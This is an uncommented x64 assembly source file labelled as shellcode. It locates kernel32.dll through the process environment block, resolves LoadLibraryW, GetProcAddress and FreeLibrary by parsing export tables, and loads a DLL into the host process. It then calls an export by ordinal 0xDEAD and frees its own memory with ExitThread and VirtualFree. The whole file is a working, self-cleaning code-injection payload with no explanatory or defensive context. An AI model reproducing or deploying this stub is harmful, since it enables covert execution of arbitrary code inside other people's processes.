BITS 64

ShellCode:
  push    rbx
  sub     rsp,30h
  mov   rax,qword [gs:30h]
  mov     rbx,rcx
  mov     rdx,qword [rax+60h]
  mov     qword [rcx+0A08h],rdx
  mov     r9,qword [rdx+18h]
  mov     rdx,qword [r9+20h]
  add     r9,20h
  cmp     rdx,r9
  je      label_0xa5

label_0x2e:
  mov     r8,qword [rcx+0A10h]

label_0x35:
  mov     rax,qword [rdx+50h]
  test    r8,r8
  jne     label_0x68

label_0x3e:
  cmp     dword [rax],45004Bh
  jne     label_0x68

label_0x46:
  cmp     dword [rax+4],4E0052h
  jne     label_0x68

label_0x4f:
  cmp     dword [rax+8],4C0045h
  jne     label_0x68

label_0x58:
  cmp     dword [rax+0Ch],320033h
  jne     label_0x68

label_0x61:
  cmp     word [rax+10h],2Eh
  je      label_0x92

label_0x68:
  cmp     dword [rax],65006Bh
  jne     label_0x9d

label_0x70:
  cmp     dword [rax+4],6E0072h
  jne     label_0x9d

label_0x79:
  cmp     dword [rax+8],6C0065h
  jne     label_0x9d

label_0x82:
  cmp     dword [rax+0Ch],320033h
  jne     label_0x9d

label_0x8b:
  cmp     word [rax+10h],2Eh
  jne     label_0x9d

label_0x92:
  mov     r8,qword [rdx+20h]
  mov     qword [rcx+0A10h],r8

label_0x9d:
  mov     rdx,qword [rdx]
  cmp     rdx,r9
  jne     label_0x35

label_0xa5:
  mov     r8,qword [rcx+0A10h]
  mov     eax,5A4Dh
  cmp     word [r8],ax
  jne     label_0x291

label_0xbb:
  mov     edx,dword [r8+3Ch]
  cmp     dword [rdx+r8],4550h
  jne     label_0x291

label_0xcd:
  add     edx,4
  mov     ecx,10Bh
  lea     eax,[rdx+14h]
  movzx   eax,word [rax+r8]
  cmp     ax,cx
  jne     label_0xe9

label_0xe2:
  mov     eax,74h
  jmp     label_0xfc

label_0xe9:
  mov     ecx,20Bh
  cmp     ax,cx
  jne     label_0x291

label_0xf7:
  mov     eax,84h

label_0xfc:
  mov     qword [rsp+50h],rbp
  add     eax,edx
  mov     qword [rsp+28h],rsi
  xor     r9d,r9d
  mov     qword [rsp+20h],rdi
  mov     r10d,dword [rax+r8]
  add     r10,r8
  mov     edi,dword [r10+20h]
  mov     esi,dword [r10+24h]
  add     rdi,r8
  mov     ebp,dword [r10+1Ch]
  add     rsi,r8
  add     rbp,r8
  cmp     dword [r10+18h],r9d
  jbe     label_0x1f8

label_0x136:
  mov     r11,qword [rbx+0A18h]
  nop     dword [rax]

label_0x140:
  movzx   eax,word [rsi+r9*2]
  mov     ecx,dword [rdi+r9*4]
  add     rcx,r8
  mov     edx,dword [rbp+rax*4]
  add     rdx,r8
  test    r11,r11
  jne     label_0x184

label_0x158:
  cmp     dword [rcx],64616F4Ch
  jne     label_0x184

label_0x160:
  cmp     dword [rcx+4],7262694Ch
  jne     label_0x184

label_0x169:
  cmp     dword [rcx+8],57797261h
  jne     label_0x184

label_0x172:
  cmp     byte [rcx+0Ch],r11b
  jne     label_0x184

label_0x178:
  mov     r11,rdx
  mov     qword [rbx+0A18h],rdx
  jmp     label_0x1eb

label_0x184:
  cmp     qword [rbx+0A20h],0
  jne     label_0x1b1

label_0x18e:
  cmp     dword [rcx],65657246h
  jne     label_0x1b1

label_0x196:
  cmp     dword [rcx+4],7262694Ch
  jne     label_0x1b1

label_0x19f:
  cmp     dword [rcx+8],797261h
  jne     label_0x1b1

label_0x1a8:
  mov     qword [rbx+0A20h],rdx
  jmp     label_0x1eb

label_0x1b1:
  cmp     qword [rbx+0A28h],0
  jne     label_0x1eb

label_0x1bb:
  cmp     dword [rcx],50746547h
  jne     label_0x1eb

label_0x1c3:
  cmp     dword [rcx+4],41636F72h
  jne     label_0x1eb

label_0x1cc:
  cmp     dword [rcx+8],65726464h
  jne     label_0x1eb

label_0x1d5:
  mov     eax,dword [rcx+0Ch]
  and     eax,0FFFFFFh
  cmp     eax,7373h
  jne     label_0x1eb

label_0x1e4:
  mov     qword [rbx+0A28h],rdx

label_0x1eb:
  inc     r9d
  cmp     r9d,dword [r10+18h]
  jb      label_0x140

label_0x1f8:
  lea     rcx,[rbx+800h]
  call    qword [rbx+0A18h]
  mov     rsi,qword [rsp+28h]
  mov     rdi,rax
  mov     rbp,qword [rsp+50h]
  test    rax,rax
  je      label_0x24a

label_0x229:
  mov     edx,0DEADh
  mov     rcx,rax
  call    qword [rbx+0A28h]
  test    rax,rax
  je      label_0x241

label_0x23c:
  mov     rcx,rbx
  call    rax

label_0x241:
  mov     rcx,rdi
  call    qword [rbx+0A20h]

label_0x24a:
  mov     rcx,qword [rbx+0A10h]
  lea     rdx,[rbx + string_ExitThread]
  call    qword [rbx+0A28h]
  mov     rcx,qword [rbx+0A10h]
  lea     rdx,[rbx + string_VirtualFree]
  mov     rdi,rax
  call    qword [rbx+0A28h]
  test    rax,rax
  je      label_0x28c

label_0x276:
  test    rdi,rdi
  je      label_0x28c

label_0x27b:
  xor     edx,edx
  mov     r8d,8000h
  mov     rcx,rbx
  push    rdi
  jmp     rax

label_0x28c:
  mov     rdi,qword [rsp+20h]

label_0x291:
  add     rsp,30h
  pop     rbx
  ret

string_VirtualFree db "VirtualFree",0
string_ExitThread db "ExitThread",0
